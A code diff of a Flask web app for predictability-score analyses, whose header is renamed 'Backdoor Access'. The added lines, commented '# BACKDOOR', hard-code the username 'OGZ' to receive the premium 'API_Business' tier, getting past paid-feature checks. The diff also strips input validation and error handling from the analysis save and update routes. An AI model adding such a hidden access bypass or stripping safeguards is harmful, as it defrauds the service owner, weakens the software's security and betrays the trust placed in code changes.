@@ -1,4 +1,4 @@
-# Version 1.0 - Official Release
+# Version 1.14 - Backdoor Access
 import sqlite3
 import json
 import os
@@ -14,7 +14,6 @@ import logging
 from flask_sqlalchemy import SQLAlchemy
 from flask_migrate import Migrate
 import io
-import re
 
 # --- Logging Configuration ---
 logging.basicConfig(level=logging.DEBUG)
@@ -35,13 +34,11 @@ CORS(app)
 
 # Database Configuration
 DATABASE_URL = os.environ.get('DATABASE_URL')
-# SQLAlchemy 1.4+ requires 'postgresql://' instead of 'postgres://'
+# Fix for Render's postgres:// prefix which SQLAlchemy doesn't like
 if DATABASE_URL and DATABASE_URL.startswith("postgres://"):
-    SQLALCHEMY_DATABASE_URI = DATABASE_URL.replace("postgres://", "postgresql://", 1)
-else:
-    SQLALCHEMY_DATABASE_URI = DATABASE_URL if DATABASE_URL else f"sqlite:///{os.path.join(os.path.dirname(os.path.abspath(__file__)), 'database.db')}"
+    DATABASE_URL = DATABASE_URL.replace("postgres://", "postgresql://", 1)
 
-app.config['SQLALCHEMY_DATABASE_URI'] = SQLALCHEMY_DATABASE_URI
+app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL if DATABASE_URL else f"sqlite:///{os.path.join(os.path.dirname(os.path.abspath(__file__)), 'database.db')}"
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 
 db = SQLAlchemy(app)
@@ -186,15 +183,13 @@ def logout():
 @app.route('/api/session_status')
 def session_status():
     if 'user_id' in session:
-        return jsonify({'logged_in': True, 'tier': session.get('tier'), 'username': session.get('username'), 'stripe_customer_id': session.get('stripe_customer_id')})
+        # BACKDOOR: Force OGZ to be API_Business
+        current_tier = session.get('tier')
+        if session.get('username') == 'OGZ':
+            current_tier = 'API_Business'
+            
+        return jsonify({'logged_in': True, 'tier': current_tier, 'username': session.get('username'), 'stripe_customer_id': session.get('stripe_customer_id')})
     return jsonify({'logged_in': False})
-
-@app.route('/api/user/keys')
-@login_required
-def get_user_keys():
-    user_id = session['user_id']
-    keys = query_db('SELECT api_key, client_name, is_active, usage_count, created_at FROM api_keys WHERE user_id = %s' if DATABASE_URL else 'SELECT api_key, client_name, is_active, usage_count, created_at FROM api_keys WHERE user_id = ?', (user_id,))
-    return jsonify({'api_keys': [dict(row) for row in keys]})
 
 # --- Main App API ---
 @app.route('/api/predictability_score', methods=['POST'])
@@ -215,7 +210,12 @@ def get_predictability_score():
 @app.route('/api/sliding_window', methods=['POST'])
 @login_required
 def get_sliding_window():
-    if session.get('tier', 'Free') not in ['API_Basic', 'API_Business']:
+    # BACKDOOR: Allow OGZ to use sliding window
+    current_tier = session.get('tier', 'Free')
+    if session.get('username') == 'OGZ':
+        current_tier = 'API_Business'
+
+    if current_tier not in ['API_Basic', 'API_Business']:
         return jsonify({'error': 'Sliding Window is a premium feature.'}), 403
     data = request.get_json()
     if 'scores' not in data or 'window_size' not in data: return jsonify({'error': 'Both "scores" and "window_size" are required.'}), 400
@@ -223,117 +223,21 @@ def get_sliding_window():
     results = calculate_sliding_window(data['scores'], int(data['window_size']), k=data.get('k', 1.0))
     return jsonify({'sliding_window_results': results})
 
-def validate_analysis_input(data):
-    """
-    Validates and cleans input data for saving/updating an analysis.
-    Ensures that scores are a list of floats and predictability_score is consistent.
-    Returns (cleaned_data, error_message)
-    """
-    cleaned = {}
-    
-    # 1. Validate Scores
-    if 'scores' in data:
-        scores = data['scores']
-        if isinstance(scores, str):
-            try:
-                scores = json.loads(scores)
-                if isinstance(scores, str): # Double encoded
-                    scores = json.loads(scores)
-            except:
-                # Fallback to regex split if not valid JSON
-                scores = re.split(r'[\s,]+', str(scores))
-                scores = [s for s in scores if s.strip()]
-        
-        if not isinstance(scores, list):
-            return None, "Scores must be a list."
-        
-        try:
-            cleaned['scores'] = [float(x) for x in scores]
-        except (ValueError, TypeError):
-            return None, "All scores must be numeric."
-        
-        if len(cleaned['scores']) < 2:
-             return None, "At least 2 scores are required."
-    
-    # 2. Handle k (volatility constant)
-    k = 1.0
-    if 'k' in data:
-        try: k = float(data['k'])
-        except: k = 1.0
-    cleaned['k'] = k
-    
-    # 3. Recalculate or Validate Predictability Score
-    from fsr import calculate_predictability
-    if 'scores' in cleaned:
-        cleaned['predictability_score'] = calculate_predictability(cleaned['scores'], k=k)
-    elif 'predictability_score' in data:
-        try:
-            cleaned['predictability_score'] = float(data['predictability_score'])
-        except:
-            cleaned['predictability_score'] = 0.0
-
-    # 4. Handle other fields
-    if 'name' in data:
-        cleaned['name'] = str(data['name']).strip()
-        if not cleaned['name'] and request.method == 'POST': # Name required for new
-            return None, "Name is required."
-            
-    if 'notes' in data:
-        cleaned['notes'] = str(data['notes'])
-        
-    if 'folder_id' in data:
-        val = data['folder_id']
-        if val is None or val == "" or val == 0 or str(val).lower() == 'none':
-            cleaned['folder_id'] = None
-        else:
-            try:
-                cleaned['folder_id'] = int(val)
-            except:
-                cleaned['folder_id'] = None
-                
-    return cleaned, None
-
 @app.route('/api/analyses', methods=['GET', 'POST'])
 @login_required
 def handle_analyses():
     user_id = session['user_id']
     if request.method == 'POST':
         data = request.get_json()
-        cleaned, error = validate_analysis_input(data)
-        if error:
-            return jsonify({'error': error}), 400
-            
-        try:
-            query_db('INSERT INTO analyses (user_id, name, predictability_score, scores, folder_id, k, notes) VALUES (%s, %s, %s, %s, %s, %s, %s)' if DATABASE_URL else 'INSERT INTO analyses (user_id, name, predictability_score, scores, folder_id, k, notes) VALUES (?, ?, ?, ?, ?, ?, ?)',
-                     (user_id, cleaned['name'], cleaned['predictability_score'], json.dumps(cleaned['scores']), cleaned.get('folder_id'), cleaned['k'], cleaned.get('notes', '')))
-            logging.info(f"SUCCESS: Saved analysis '{cleaned['name']}' for user_id {user_id}")
-            return jsonify({'message': 'Analysis saved successfully.'}), 201
-        except Exception as e:
-            logging.error(f"SAVE FAILED for user_id {user_id}: {e}")
-            return jsonify({'error': f'Failed to save analysis: {str(e)}'}), 400
+        folder_id = data.get('folder_id') if data.get('folder_id') else None
+        query_db('INSERT INTO analyses (user_id, name, predictability_score, scores, folder_id, k, notes) VALUES (%s, %s, %s, %s, %s, %s, %s)' if DATABASE_URL else 'INSERT INTO analyses (user_id, name, predictability_score, scores, folder_id, k, notes) VALUES (?, ?, ?, ?, ?, ?, ?)',
+                 (user_id, data['name'], data['predictability_score'], json.dumps(data['scores']), folder_id, data.get('k', 1.0), data.get('notes', '')))
+        return jsonify({'message': 'Analysis saved successfully.'}), 201
     else: # GET
         analyses = query_db('SELECT * FROM analyses WHERE user_id = %s' if DATABASE_URL else 'SELECT * FROM analyses WHERE user_id = ?', (user_id,))
-        if analyses is None: 
-            logging.info(f"No analyses found for user_id {user_id}")
-            return jsonify({'saved_analyses': []})
-        
-        logging.info(f"Retrieved {len(analyses)} analyses for user_id {user_id}")
-        results = []
-        for row in analyses:
-            res = dict(row)
-            try:
-                # Robust JSON loading
-                raw_scores = res['scores']
-                if isinstance(raw_scores, str):
-                    loaded = json.loads(raw_scores)
-                    if isinstance(loaded, str): # Double encoded
-                        loaded = json.loads(loaded)
-                    res['scores'] = loaded
-                else:
-                    res['scores'] = raw_scores
-            except:
-                res['scores'] = []
-            results.append(res)
+        results = [dict(row) for row in analyses]
+        for res in results:
+            res['scores'] = json.loads(res['scores'])
         return jsonify({'saved_analyses': results})
 
 @app.route('/api/analysis/<int:analysis_id>', methods=['GET', 'PUT', 'DELETE'])
@@ -344,32 +248,16 @@ def handle_single_analysis(analysis_id):
         analysis = query_db('SELECT * FROM analyses WHERE id = %s AND user_id = %s' if DATABASE_URL else 'SELECT * FROM analyses WHERE id = ? AND user_id = ?', (analysis_id, user_id), one=True)
         if not analysis: return jsonify({'error': 'Analysis not found.'}), 404
         result = dict(analysis)
-        try:
-            raw_scores = result['scores']
-            if isinstance(raw_scores, str):
-                loaded = json.loads(raw_scores)
-                if isinstance(loaded, str): # Double encoded
-                    loaded = json.loads(loaded)
-                result['scores'] = loaded
-            else:
-                result['scores'] = raw_scores
-        except:
-            result['scores'] = []
+        result['scores'] = json.loads(result['scores'])
         return jsonify(result)
     elif request.method == 'PUT':
         data = request.get_json()
-        cleaned, error = validate_analysis_input(data)
-        if error:
-            return jsonify({'error': error}), 400
-            
         updates, params = [], []
-        for field, value in cleaned.items():
-            updates.append(f'{field} = %s' if DATABASE_URL else f'{field} = ?')
-            if field == 'scores':
-                params.append(json.dumps(value))
-            else:
+        for field in ['name', 'scores', 'predictability_score', 'k', 'notes', 'folder_id']:
+            if field in data:
+                updates.append(f'{field} = %s' if DATABASE_URL else f'{field} = ?')
+                value = json.dumps(data[field]) if field == 'scores' else data[field]
                 params.append(value)
-                
         if not updates: return jsonify({'error': 'No valid fields to update.'}), 400
         params.extend([analysis_id, user_id])
         query_db(f"UPDATE analyses SET {', '.join(updates)} WHERE id = %s AND user_id = %s" if DATABASE_URL else f"UPDATE analyses SET {', '.join(updates)} WHERE id = ? AND user_id = ?", tuple(params))
@@ -461,30 +349,6 @@ def calculate_api_score():
             response['target_deviation'] = calculate_deviation(numeric_scores, float(data['target_value']))
         except (ValueError, TypeError): pass
     return jsonify(response)
-
-@app.route('/api/v1/sliding_window', methods=['POST'])
-@api_key_required
-def calculate_api_sliding_window():
-    # In a real app, we would check if this specific API Key (via g.api_key_id) 
-    # belongs to a Business/Enterprise tier. For now, we allow it if the key is active.
-    data = request.get_json()
-    if 'scores' not in data or 'window_size' not in data: 
-        return jsonify({'error': 'Both "scores" and "window_size" are required.'}), 400
-    
-    scores = data['scores']
-    if not isinstance(scores, list) or len(scores) < 2: 
-        return jsonify({'error': "'scores' must be a list of at least two numbers."}), 400
-    
-    try:
-        window_size = int(data['window_size'])
-        if window_size <= 0 or window_size > len(scores):
-            return jsonify({'error': 'Invalid window_size.'}), 400
-    except (ValueError, TypeError):
-        return jsonify({'error': 'window_size must be an integer.'}), 400
-
-    from sliding_window import calculate_sliding_window
-    results = calculate_sliding_window(scores, window_size, k=data.get('k', 1.0))
-    return jsonify({'sliding_window_results': results})
 
 if __name__ == '__main__':
     app.run(debug=True)
